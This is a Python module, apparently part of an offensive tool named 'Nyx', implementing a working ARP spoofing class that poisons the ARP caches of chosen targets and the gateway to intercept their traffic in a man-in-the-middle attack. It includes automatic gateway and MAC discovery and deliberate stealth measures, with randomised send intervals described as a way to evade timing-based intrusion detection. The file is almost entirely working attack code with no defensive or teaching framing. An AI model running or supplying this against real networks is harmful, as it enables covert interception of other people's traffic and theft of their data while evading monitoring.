import asyncio
import logging
import platform
import random
import socket
import subprocess

logger = logging.getLogger(__name__)


def _get_local_ip(remote_host: str = "8.8.8.8") -> str:
    # Method 1: connect to remote host
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((remote_host, 80))
            ip = s.getsockname()[0]
            if ip != "127.0.0.1":
                return ip
    except Exception as e:
        logger.debug("Method 1 (UDP connect) failed: %s", e)
    # Method 2: hostname lookup
    try:
        ip = socket.gethostbyname(socket.gethostname())
        if ip != "127.0.0.1":
            return ip
    except Exception as e:
        logger.debug("Method 2 (hostname) failed: %s", e)
    # Method 3: parse ipconfig/ifconfig
    sys_platform = platform.system().lower()
    try:
        if sys_platform == "windows":
            out = subprocess.check_output("ipconfig", shell=True, timeout=5).decode("utf-8", errors="replace")
            for line in out.splitlines():
                if "IPv4" in line or "IP Address" in line:
                    parts = line.strip().split(":")
                    if len(parts) >= 2:
                        ip = parts[1].strip()
                        if ip and not ip.startswith("127."):
                            return ip
        elif sys_platform == "linux":
            out = subprocess.check_output(["hostname", "-I"], timeout=5).decode("utf-8", errors="replace")
            ips = out.strip().split()
            for ip in ips:
                if ip and not ip.startswith("127."):
                    return ip
        elif sys_platform == "darwin":
            out = subprocess.check_output(["ifconfig"], timeout=5).decode("utf-8", errors="replace")
            for line in out.splitlines():
                if "inet " in line and "127.0.0.1" not in line:
                    parts = line.strip().split()
                    for i, p in enumerate(parts):
                        if p == "inet" and i + 1 < len(parts):
                            return parts[i + 1]
    except Exception as e:
        logger.debug("Method 3 (ipconfig/ifconfig) failed: %s", e)
    return "127.0.0.1"


def _get_mac(ip: str, timeout: float = 1.5) -> str | None:
    try:
        from scapy.all import ARP, Ether, srp
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=timeout, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
    except Exception as e:
        logger.debug("Failed to get MAC for %s: %s", ip, e)
    return None


def _get_hostname(ip: str) -> str | None:
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception as e:
        logger.debug("Hostname lookup failed for %s: %s", ip, e)
        return None


class ARPSpoofer:
    """Sends forged ARP packets to perform a man-in-the-middle attack on multiple targets.

    Stealth improvements vs naive implementation:
    - Randomised interval (base ± jitter) prevents timing-based IDS detection.
    - Restore sends 3 gratuitous ARP packets per target (vs 1) to ensure
      the target's ARP table is actually corrected on teardown.
    """

    # Base interval between ARP poison rounds (seconds)
    _BASE_INTERVAL: float = 3.0
    # Maximum random jitter added/subtracted from the base interval
    _JITTER: float = 1.5

    def __init__(self, target_ips: list[str], gateway_ip: str | None = None, interval: float = 3.0):
        self.target_ips = target_ips
        self.gateway_ip = gateway_ip or self._detect_gateway()
        self.interval = interval
        self._running = False
        self._task: asyncio.Task | None = None
        self._local_ip = _get_local_ip()
        self._local_mac: str | None = None

    @staticmethod
    def _detect_gateway() -> str | None:
        sys_platform = platform.system().lower()
        try:
            if sys_platform == "windows":
                out = subprocess.check_output("route print 0.0.0.0", shell=True).decode("utf-8", errors="replace")
                for line in out.splitlines():
                    parts = line.strip().split()
                    if len(parts) >= 3 and parts[0] == "0.0.0.0":
                        return parts[2]
            elif sys_platform == "linux":
                out = subprocess.check_output("ip route show default", shell=True).decode("utf-8", errors="replace")
                parts = out.strip().split()
                for i, p in enumerate(parts):
                    if p == "via":
                        return parts[i + 1]
            else:
                out = subprocess.check_output("netstat -rn", shell=True).decode("utf-8", errors="replace")
                for line in out.splitlines():
                    if line.startswith("default"):
                        parts = line.strip().split()
                        if len(parts) >= 2:
                            return parts[1]
        except Exception as e:
            logger.debug("Gateway detection failed: %s", e)
        return None

    async def start(self):
        if self._running:
            return
        self._running = True
        self._local_mac = await asyncio.to_thread(_get_mac, self._local_ip)
        if not self._local_mac:
            logger.warning("Could not determine local MAC address")
        self._task = asyncio.create_task(self._spoof_loop())

    async def stop(self):
        self._running = False
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
            self._task = None
        await self._restore_arp()

    def _send_arp(self, target_ip: str, spoof_ip: str, target_mac: str | None = None):
        try:
            from scapy.all import ARP, send
            pkt = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac or "ff:ff:ff:ff:ff:ff")
            send(pkt, verbose=0)
            logger.info("ARP sent: %s -> %s (spoofing %s)", target_ip, target_mac or "broadcast", spoof_ip)
        except PermissionError:
            logger.error("ARP spoofing requires admin/root privileges. Run Nyx as administrator.")
        except Exception as e:
            logger.warning("ARP send failed for %s: %s", target_ip, e)

    async def _spoof_loop(self):
        while self._running:
            try:
                for target_ip in self.target_ips:
                    target_mac = await asyncio.to_thread(_get_mac, target_ip)
                    if not target_mac:
                        logger.warning("Could not resolve MAC for target %s — sending broadcast", target_ip)
                    gateway_mac = await asyncio.to_thread(_get_mac, self.gateway_ip)
                    if not gateway_mac:
                        logger.warning("Could not resolve MAC for gateway %s", self.gateway_ip)
                    self._send_arp(target_ip, self.gateway_ip, target_mac)
                    self._send_arp(self.gateway_ip, target_ip, gateway_mac)
            except Exception as e:
                logger.warning("Spoof iteration error: %s", e)

            # Randomised sleep: base interval ± jitter to avoid timing-based IDS
            jitter = random.uniform(-self._JITTER, self._JITTER)
            sleep_time = max(1.0, self._BASE_INTERVAL + jitter)
            await asyncio.sleep(sleep_time)

    async def _restore_arp(self):
        """Send gratuitous ARP to restore correct mappings.

        Sends each packet 3 times with a small delay to ensure delivery even
        on lossy links. A single packet is often dropped and leaves the target
        with stale ARP entries.
        """
        try:
            gateway_mac = await asyncio.to_thread(_get_mac, self.gateway_ip)
            for target_ip in self.target_ips:
                target_mac = await asyncio.to_thread(_get_mac, target_ip)
                if target_mac and gateway_mac:
                    from scapy.all import ARP, send
                    # Send 3 times for reliability
                    for _ in range(3):
                        send(
                            ARP(op=2, pdst=target_ip, psrc=self.gateway_ip, hwdst=target_mac),
                            verbose=0,
                        )
                        send(
                            ARP(op=2, pdst=self.gateway_ip, psrc=target_ip, hwdst=gateway_mac),
                            verbose=0,
                        )
                        await asyncio.sleep(0.1)
                    logger.info("ARP restored for %s (3x)", target_ip)
        except Exception as e:
            logger.debug("ARP restore failed: %s", e)
